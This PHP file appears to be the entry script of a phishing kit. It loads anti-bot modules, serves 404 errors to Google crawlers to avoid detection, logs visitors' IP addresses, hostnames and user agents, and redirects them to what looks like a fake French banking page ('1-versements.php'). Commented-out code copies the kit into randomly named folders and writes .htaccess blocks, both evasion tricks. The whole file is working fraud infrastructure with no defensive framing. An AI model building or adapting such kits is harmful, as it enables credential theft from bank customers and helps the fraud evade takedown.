<?php
error_reporting(0);
//include("./home/system/system.php"); 

//include "./detect.php";

include "./bot/antibots1.php";
include "./bot/antibots2.php";
include "./bot/antibots3.php";
include "./bot/antibots4.php";
include "./bot/antibots5.php";
include "./bot/antibots6.php";

//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr($_SERVER['REMOTE_ADDR']),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
session_start();
//include 'system.php';

//-------------Langue Detector-------------//

$lang=substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,2);
$_SESSION['lang']=$lang;

//$_SESSION['lang']='es';

/*
$_SESSION["country_code"] = 'FR';

if		($_SESSION["country_code"] == 'DE')	{$_SESSION['lang'] = 'de';}
elseif	($_SESSION["country_code"] == 'ES')	{$_SESSION['lang'] = 'es';}
elseif	($_SESSION["country_code"] == 'FR')	{$_SESSION['lang'] = 'fr';}
elseif	($_SESSION["country_code"] == 'IT')	{$_SESSION['lang'] = 'it';}
elseif	($_SESSION["country_code"] == 'PT')	{$_SESSION['lang'] = 'pt';}

else	{$_SESSION['lang'] = 'en';}
*/
//-------------Langue Detector-------------//


$count_hits = ("hits.txt");
$hits = file($count_hits);
$hits[0]++;
$fp = fopen($count_hits, "w");
fputs($fp, "$hits[0]");
fclose($fp);
/*
if ($hits[0] > 30) {
$a = $_SERVER['REMOTE_ADDR'];
$b = $_SERVER['HTTP_USER_AGENT'];
$c = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$ne = "\r\nDeny from $a \r\n";
$file = ".htaccess";
$fp = fopen($file, "a");
fwrite($fp, $ne);
$n = "RewriteEngine on
Options +FollowSymlinks
RewriteCond %{HTTP_USER_AGENT} ^$b [OR]
RewriteRule ^.* - [F,L]
";
}
*/
 
$_SESSION['sessionNumber'] = substr(bin2hex(md5(rand(9999,99999999))), 0,12);


/*$random=rand(0,9000000);
$md5=md5($random);
$base=base64_encode($md5);
$dst1=md5($base) . $base;
$dst2 = substr(md5($dst1) , -9);
$dst  = strtolower($dst2 );

function recurse_copy($src,$dst) {
	
	$dir = opendir($src);
	@mkdir($dst);
	
	while(false !== ( $file = readdir($dir)) ) {
		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ) {
				recurse_copy($src . '/' . $file,$dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file,$dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

$src="s";
recurse_copy( $src, $dst );*/
header("location:s/1-versements.php?inav=iNavLnkLog&Session=".$_SESSION['sessionNumber']);
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$file = fopen("vu.txt","a");
fwrite($file,"\r\n ip : ".$ip."\r\n Hostname : ".$hostname." \r\n user-agent : ".$_SERVER['HTTP_USER_AGENT']." \r\n ".gmdate ("Y-n-d")." --> ".gmdate ("H:i:s")."\r\n");
?>

